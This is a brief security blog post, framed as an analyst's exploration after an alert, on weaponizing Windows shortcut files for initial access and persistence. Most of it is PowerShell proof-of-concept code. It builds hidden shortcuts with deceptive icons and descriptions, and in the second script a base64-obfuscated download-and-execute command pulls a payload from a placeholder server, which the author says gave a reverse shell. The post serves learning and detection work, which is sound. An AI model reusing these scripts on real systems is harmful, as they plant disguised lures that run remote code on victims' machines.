---
layout: post
title: Weaponizing Shortcut Modification
subtitle: Exploring T1547.009 
cover-img: /assets/img/honk.png
thumbnail-img: /assets/img/shortcut.png
share-img: /assets/img/shortcut.png
tags: [poc, shortcut]
---

The other day I was investigating an alert for what was suspected to be a malicious lnk file. I had not really seen many of these in the wild, so I decided to take a bit of extra time to see what an true positive might look like. I found some useful PoC resources to help me create my own attack.

The original Powershell script that I modified can be seen below. I pulled it directly from the link to [v3ded's](https://v3ded.github.io/) post included in the resources section.

~~~
$path                      = "$([Environment]::GetFolderPath('Desktop'))\FakeText.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c calc.exe"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
~~~

Branching from this, I decided to add an IEX statement to download a payload hosted on a remote server. I had it pull and execute shellcode to give me a reverse shell.

~~~
$path = "$([Environment]::GetFolderPath('Desktop'))\RealText.lnk"
$wshell = New-Object -ComObject Wscript.Shell
$shortcut = $wshell.CreateShortcut($path)
$cmd = [System.Text.Encoding]::ascii.GetString([System.Convert]::FromBase64String('SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzAuMC4wLjA6ODAwMC9maWxlLnR4dCcpKQ=='))
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = " -c $cmd"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey = "CTRL+C"
$shortcut.Description = "I'm a dolphin, not a virus"
$shortcut.WindowStyle      = 7
$shortcut.Save()
(Get-Item $path).Attributes += 'Hidden'
~~~


**Resources**

| Type | Link |
| :------ | :--- |
| PoC | [https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence](https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence) |
| PoC | [https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk) |

